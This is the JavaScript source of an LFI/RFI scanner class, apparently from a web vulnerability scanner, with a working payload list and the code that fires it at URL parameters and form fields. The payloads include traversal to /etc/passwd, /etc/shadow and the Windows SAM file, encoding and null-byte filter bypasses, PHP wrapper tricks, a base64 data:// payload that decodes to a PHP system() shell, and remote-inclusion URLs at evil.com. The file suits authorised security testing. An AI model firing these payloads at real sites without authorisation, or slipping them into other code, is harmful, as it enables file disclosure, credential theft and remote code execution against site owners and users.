import { BaseScanner } from './BaseScanner.js';

export class LFIScanner extends BaseScanner {
  constructor(config) {
    super(config);
    this.name = 'LFI/RFI Scanner';
    
    // LFI payloads
    this.payloads = [
      // Basic traversal
      '../../../etc/passwd',
      '../../../../etc/passwd',
      '../../../../../etc/passwd',
      '../../../../../../etc/passwd',
      '../../../../../../../etc/passwd',
      '../../../../../../../../etc/passwd',
      
      // Windows paths
      '../../../windows/system32/drivers/etc/hosts',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      
      // URL encoding
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%2f..%2f..%2fetc%2fpasswd',
      '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
      '..%252f..%252f..%252fetc/passwd',
      
      // Double encoding
      '%252e%252e%252f%252e%252e%252fetc%252fpasswd',
      
      // Null byte injection (older PHP)
      '../../../etc/passwd%00',
      '../../../etc/passwd%00.jpg',
      '../../../etc/passwd\0',
      
      // Filter bypass
      '....//....//....//etc/passwd',
      '..../..../..../etc/passwd',
      '....\\....\\....\\windows\\system32\\drivers\\etc\\hosts',
      
      // PHP wrappers
      'php://filter/convert.base64-encode/resource=../../../etc/passwd',
      'php://filter/read=string.rot13/resource=../../../etc/passwd',
      'php://filter/convert.base64-encode/resource=index.php',
      'php://input',
      'php://data',
      'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+',
      'expect://id',
      'phar://test.phar',
      
      // Common files to check
      '/etc/passwd',
      '/etc/shadow',
      '/etc/hosts',
      '/etc/issue',
      '/proc/self/environ',
      '/proc/version',
      '/proc/cmdline',
      '/var/log/apache/access.log',
      '/var/log/apache2/access.log',
      '/var/log/nginx/access.log',
      '/var/log/httpd/access_log',
      'C:\\boot.ini',
      'C:\\Windows\\System32\\config\\SAM',
      
      // Wrapper payloads for code execution
      'zip://shell.jpg%23payload.php',
      'file:///etc/passwd'
    ];
    
    // RFI payloads (only test with safe URLs)
    this.rfiPayloads = [
      'http://evil.com/shell.txt',
      'https://raw.githubusercontent.com/test/test.txt',
      '//evil.com/shell.txt'
    ];
    
    // File inclusion parameters
    this.fileParameters = [
      'file', 'filename', 'filepath', 'path',
      'page', 'include', 'inc', 'require',
      'dir', 'directory', 'document', 'doc',
      'folder', 'root', 'pg', 'style',
      'template', 'tpl', 'php_path', 'basepath',
      'pdf', 'lang', 'language', 'view',
      'content', 'cont', 'layout', 'mod',
      'conf', 'config', 'type', 'archive',
      'site', 'load', 'read', 'data'
    ];
  }
  
  async scan(data) {
    const vulnerabilities = [];
    const { urls, forms, parameters } = data;
    
    // Identify file-related parameters
    const potentialParams = parameters.filter(p => 
      this.fileParameters.some(fp => p.toLowerCase().includes(fp))
    );
    
    // Test URL parameters
    for (const url of urls) {
      if (this.stopped) break;
      
      try {
        const parsedUrl = new URL(url);
        
        for (const [key, value] of parsedUrl.searchParams.entries()) {
          if (potentialParams.includes(key) || this.looksLikeFilePath(value)) {
            const vulns = await this.testParameter(url, key, value);
            vulnerabilities.push(...vulns);
          }
        }
      } catch (error) {
        this.log(`LFI URL parse error: ${error.message}`, 'debug');
      }
    }
    
    // Test forms
    for (const form of forms) {
      if (this.stopped) break;
      
      for (const input of form.inputs) {
        if (!input.name) continue;
        
        if (this.fileParameters.some(fp => input.name.toLowerCase().includes(fp))) {
          const vulns = await this.testFormInput(form, input);
          vulnerabilities.push(...vulns);
        }
      }
    }
    
    return vulnerabilities;
  }
  
  async testParameter(baseUrl, paramName, originalValue) {
    const vulnerabilities = [];
    const testPayloads = this.getTestPayloads();
    
    for (const payload of testPayloads) {
      if (this.stopped) break;
      
      try {
        const testUrl = new URL(baseUrl);
        testUrl.searchParams.set(paramName, payload);
        
        const response = await this.makeRequest(testUrl.href);
        if (!response) continue;
        
        const lfiIndicators = this.detectLFI(response.data, payload);
        
        if (lfiIndicators.detected) {
          vulnerabilities.push({
            type: 'LFI',
            subType: lfiIndicators.type,
            severity: 'critical',
            url: baseUrl,
            parameter: paramName,
            payload: payload,
            evidence: lfiIndicators.evidence,
            description: `Local File Inclusion vulnerability in parameter "${paramName}". ${lfiIndicators.description}`,
            remediation: 'Never use user input directly in file operations. Implement allowlists for file paths. Use realpath() to resolve paths and validate against a base directory.',
            references: [
              'https://portswigger.net/web-security/file-path-traversal',
              'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion'
            ],
            cvss: 9.1,
            cwe: 'CWE-98'
          });
          
          break;
        }
      } catch (error) {
        this.log(`LFI test error: ${error.message}`, 'debug');
      }
    }
    
    return vulnerabilities;
  }
  
  async testFormInput(form, input) {
    const vulnerabilities = [];
    const testPayloads = this.getTestPayloads();
    
    for (const payload of testPayloads) {
      if (this.stopped) break;
      
      const formData = {};
      form.inputs.forEach(inp => {
        formData[inp.name] = inp.name === input.name ? payload : inp.value || 'test';
      });
      
      try {
        const response = await this.makeRequest(form.action, {
          method: form.method,
          data: form.method === 'POST' ? formData : undefined,
          params: form.method === 'GET' ? formData : undefined
        });
        
        if (!response) continue;
        
        const lfiIndicators = this.detectLFI(response.data, payload);
        
        if (lfiIndicators.detected) {
          vulnerabilities.push({
            type: 'LFI',
            subType: lfiIndicators.type,
            severity: 'critical',
            url: form.action,
            method: form.method,
            parameter: input.name,
            payload: payload,
            evidence: lfiIndicators.evidence,
            description: `LFI vulnerability in form field "${input.name}"`,
            remediation: 'Validate and sanitize all file path inputs.',
            references: [
              'https://portswigger.net/web-security/file-path-traversal'
            ],
            cvss: 9.1,
            cwe: 'CWE-98'
          });
          break;
        }
      } catch (error) {
        this.log(`LFI form test error: ${error.message}`, 'debug');
      }
    }
    
    return vulnerabilities;
  }
  
  detectLFI(body, payload) {
    const result = {
      detected: false,
      type: '',
      evidence: '',
      description: ''
    };
    
    if (!body || typeof body !== 'string') return result;
    
    // Linux indicators
    const linuxPatterns = [
      { pattern: /root:.*:0:0:/i, type: '/etc/passwd', desc: 'System passwd file exposed' },
      { pattern: /daemon:.*:1:1:/i, type: '/etc/passwd', desc: 'System passwd file exposed' },
      { pattern: /nobody:.*:65534:/i, type: '/etc/passwd', desc: 'System passwd file exposed' },
      { pattern: /Linux version/i, type: '/proc/version', desc: 'System version exposed' },
      { pattern: /BOOT_IMAGE=/i, type: '/proc/cmdline', desc: 'System boot parameters exposed' },
      { pattern: /HTTP_USER_AGENT=/i, type: '/proc/environ', desc: 'Environment variables exposed' }
    ];
    
    // Windows indicators
    const windowsPatterns = [
      { pattern: /\[boot loader\]/i, type: 'boot.ini', desc: 'Windows boot file exposed' },
      { pattern: /\[operating systems\]/i, type: 'boot.ini', desc: 'Windows boot file exposed' },
      { pattern: /127\.0\.0\.1\s+localhost/i, type: 'hosts file', desc: 'System hosts file exposed' }
    ];
    
    // PHP wrapper indicators
    const wrapperPatterns = [
      { pattern: /^[a-zA-Z0-9+\/=]{50,}$/m, type: 'Base64 encoded file', desc: 'File content in base64' },
      { pattern: /<\?php/i, type: 'PHP Source', desc: 'PHP source code exposed' }
    ];
    
    const allPatterns = [...linuxPatterns, ...windowsPatterns, ...wrapperPatterns];
    
    for (const p of allPatterns) {
      if (p.pattern.test(body)) {
        result.detected = true;
        result.type = p.type;
        result.evidence = this.extractEvidence(body, p.pattern);
        result.description = p.desc;
        return result;
      }
    }
    
    // Check for error messages indicating LFI attempt
    const errorPatterns = [
      /failed to open stream/i,
      /include_path/i,
      /No such file or directory/i,
      /not found or unable to stat/i
    ];
    
    for (const errorPattern of errorPatterns) {
      if (errorPattern.test(body) && payload.includes('..')) {
        result.detected = true;
        result.type = 'Error-based LFI';
        result.evidence = `Error message: ${body.match(errorPattern)[0]}`;
        result.description = 'Error message indicates file inclusion attempt';
        return result;
      }
    }
    
    return result;
  }
  
  extractEvidence(body, pattern) {
    const match = body.match(pattern);
    if (!match) return '';
    
    const index = body.indexOf(match[0]);
    const start = Math.max(0, index - 30);
    const end = Math.min(body.length, index + match[0].length + 30);
    
    return '...' + body.substring(start, end) + '...';
  }
  
  getTestPayloads() {
    return [
      '../../../etc/passwd',
      '../../../../etc/passwd',
      '../../../../../etc/passwd',
      '..%2f..%2f..%2fetc%2fpasswd',
      '....//....//....//etc/passwd',
      'php://filter/convert.base64-encode/resource=../../../etc/passwd',
      '../../../windows/system32/drivers/etc/hosts'
    ];
  }
  
  looksLikeFilePath(value) {
    if (!value) return false;
    return /\.(php|html|inc|tpl|txt|log|conf|xml|json|js|css)$/i.test(value) ||
           /^[a-zA-Z]:\\/.test(value) ||
           /^\/[a-z]/i.test(value);
  }
}
